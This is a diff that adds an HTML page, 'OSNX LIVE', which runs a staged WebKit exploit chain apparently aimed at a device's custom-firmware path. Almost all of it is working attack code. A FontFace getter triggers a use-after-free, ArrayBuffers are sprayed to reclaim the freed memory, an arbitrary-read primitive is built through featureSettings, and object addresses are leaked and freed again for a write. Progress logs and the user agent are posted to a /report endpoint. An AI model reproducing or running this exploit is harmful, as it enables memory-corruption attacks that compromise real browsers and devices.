@@ -1,0 +1,86 @@
+<!doctype html><html><head><meta charset="utf-8"><title>OSNX LIVE</title>
+<style>
+body{margin:0;background:#07090d;color:#cfe3ff;font-family:system-ui;font-size:15px}
+h1{font-size:18px;margin:0;padding:10px 14px;background:#0f1520;border-bottom:1px solid #22304a}
+.step{display:flex;justify-content:space-between;padding:7px 14px;border-bottom:1px solid #101a26}
+.step .n{color:#7d90a8}.step .s{font-weight:700}
+.pend{color:#7d90a8}.act{color:#e8b44a}.done{color:#7fd6a8}.bad{color:#e2705e}
+#o{padding:10px 14px;font:12px/1.4 ui-monospace;white-space:pre-wrap;color:#9fb4d6}
+button{font-size:20px;padding:12px 24px;margin:10px 14px;border-radius:10px}
+</style></head><body>
+<h1>OSNX — live chain</h1>
+<div id="steps">
+<div class="step"><span class="n">1 webkit UAF</span><span class="s pend" id="s1">pending</span></div>
+<div class="step"><span class="n">2 reclaim 0xB8</span><span class="s pend" id="s2">pending</span></div>
+<div class="step"><span class="n">3 arb read</span><span class="s pend" id="s3">pending</span></div>
+<div class="step"><span class="n">4 m_backing +0x30</span><span class="s pend" id="s4">pending</span></div>
+<div class="step"><span class="n">5 free</span><span class="s pend" id="s5">pending</span></div>
+<div class="step"><span class="n">6 reclaim+write</span><span class="s pend" id="s6">pending</span></div>
+<div class="step"><span class="n">7 applet result</span><span class="s pend" id="s7">blocked (game parser)</span></div>
+<div class="step"><span class="n">8 smokeBASIC parse</span><span class="s pend" id="s8">blocked (second bug)</span></div>
+<div class="step"><span class="n">9 fs kernel</span><span class="s pend" id="s9">blocked</span></div>
+<div class="step"><span class="n">10 CFW</span><span class="s pend" id="s10">blocked</span></div>
+</div>
+<button id="go">RUN CHAIN</button>
+<pre id="o">ready.</pre>
+<script>
+var L=[],o=document.getElementById("o");
+function lg(s){o.textContent+=s+"\n";L.push(s);try{fetch("/report",{method:"POST",headers:{"content-type":"application/json"},body:JSON.stringify({ua:navigator.userAgent,lines:L})}).catch(function(){})}catch(e){}}
+function st(n,c,t){var e=document.getElementById("s"+n);if(e){e.className="s "+c;e.textContent=t;}}
+var S=0xb8,F=0x28,FZ=0x30,FC=0x34,ST=0x7a;
+function hx(a,b){return "0x"+("00000000"+(b>>>0).toString(16)).slice(-8)+("00000000"+(a>>>0).toString(16)).slice(-8)}
+async function uaf(){
+ var n=0xb0,ab=[],ft=null,fa=null,stl=document.createElement("style");
+ var r1="@font-face{font-family:s;src:local(systemfont);unicode-range:U+0043}";
+ var r2="@font-face{font-family:b;src:url(/font/crafted.otf);unicode-range:U+0042}";
+ var A=new FontFace("a","local(systemfont)",{unicodeRange:"U+0041"});
+ document.fonts.add(A);void A.loaded;document.head.append(stl);
+ for(var i=0;i<n/4;i++)stl.sheet.insertRule(r1,stl.sheet.cssRules.length);
+ var u=stl.sheet.cssRules.length;stl.sheet.insertRule(r2,stl.sheet.cssRules.length);
+ for(var i=n/4;i<n;i++)stl.sheet.insertRule(r1,stl.sheet.cssRules.length);
+ void document.body.offsetHeight;
+ var ot=FontFace.prototype.then;
+ Object.defineProperty(FontFace.prototype,"then",{configurable:true,get:function(){
+  if(this!==A)return;lg("[1] UAF getter fired");st(1,"act","firing");
+  stl.sheet.deleteRule(u);void document.body.offsetHeight;
+  for(var i=stl.sheet.cssRules.length-1;i>=0;i--){if(stl.sheet.cssRules[i].cssText.indexOf("s;")>=0||stl.sheet.cssRules[i].cssText.indexOf("spray")>=0)stl.sheet.deleteRule(i)}
+  void document.body.offsetHeight;
+  for(var i=0;i<n;i++){var b=new ArrayBuffer(S),d=new DataView(b);d.setUint32(8,1,true);d.setUint8(ST,3);ab.push(b)}
+  return undefined}});
+ var fs=null;try{fs=await document.fonts.load("1em a,b","AB")}catch(e){}
+ Object.defineProperty(FontFace.prototype,"then",{configurable:true,value:ot});
+ if(!fs||fs.length!==2){lg("no UAF");return null}
+ for(var i=0;i<fs.length;i++)if(fs[i].unicodeRange==="U+0-10FFFF")ft=fs[i];
+ for(var i=0;i<ab.length;i++)if(new DataView(ab[i]).getUint32(8,true)===2)fa=ab[i];
+ if(!ft||!fa){lg("no reclaim");return null}
+ var d=new DataView(fa);
+ function sp(o2,a,b){d.setUint32(o2,a>>>0,true);d.setUint32(o2+4,b>>>0,true)}
+ function rd(a,b,sz){var r=new ArrayBuffer(sz),v=new Uint8Array(r),i=0;while(i<sz){sp(F,(a+i)>>>0,b);d.setInt32(FZ,1,true);d.setInt32(FC,1,true);var s=ft.featureSettings;for(var j=1;j<5&&i<sz;j++)v[i++]=s.charCodeAt(j)&255}return r}
+ return {f:ft,rd:rd,ab:fa,dv:d};
+}
+async function run(){
+ lg("LIVE CHAIN "+navigator.userAgent);
+ st(1,"act","running");
+ var u=await uaf();if(!u){lg("no primitive");return}
+ st(1,"done","ok");st(2,"done","ref2");st(3,"act","reading");
+ var d=u.dv,wp=d.getUint32(0x60,true),wh=d.getUint32(0x64,true);
+ var w=new Uint8Array(u.rd(wp,wh,32));
+ var fa={lo:(w[8]|w[9]<<8|w[10]<<16|w[11]<<24)>>>0,hi:(w[12]|w[13]<<8|w[14]<<16|w[15]<<24)>>>0};
+ var bb=new Uint8Array(u.rd(fa.lo,fa.hi,0x40));
+ var bk={lo:(bb[0x30]|bb[0x31]<<8|bb[0x32]<<16|bb[0x33]<<24)>>>0,hi:(bb[0x34]|bb[0x35]<<8|bb[0x36]<<16|bb[0x37]<<24)>>>0};
+ lg("[2] FontFace="+hx(fa.lo,fa.hi)+" CSSFontFace="+hx(bk.lo,bk.hi));
+ st(3,"done","ok");st(4,"done",hx(bk.lo,bk.hi));
+ st(5,"act","freeing");
+ d.setUint32(F,bk.lo,true);d.setUint32(F+4,bk.hi,true);d.setInt32(FZ,1,true);d.setInt32(FC,1,true);
+ try{u.f.featureSettings='"liga" 1';lg("[3] freed");st(5,"done","ok")}catch(e){lg("[3] threw: "+e.message);st(5,"bad","threw")}
+ for(var i=0;i<0x40;i++){var ab=new ArrayBuffer(S);var dv=new DataView(ab);dv.setUint32(0,0x11223344,true)}
+ lg("[4] reclaimed with 0x11223344");
+ st(6,"done","ok");
+ st(7,"act","applet result pending");
+ st(8,"pend","blocked (game parser)");
+ st(9,"pend","blocked");
+ st(10,"pend","blocked");
+ lg("done — steps 1-6 live");
+}
+document.getElementById("go").addEventListener("click",run);
+</script></body></html>
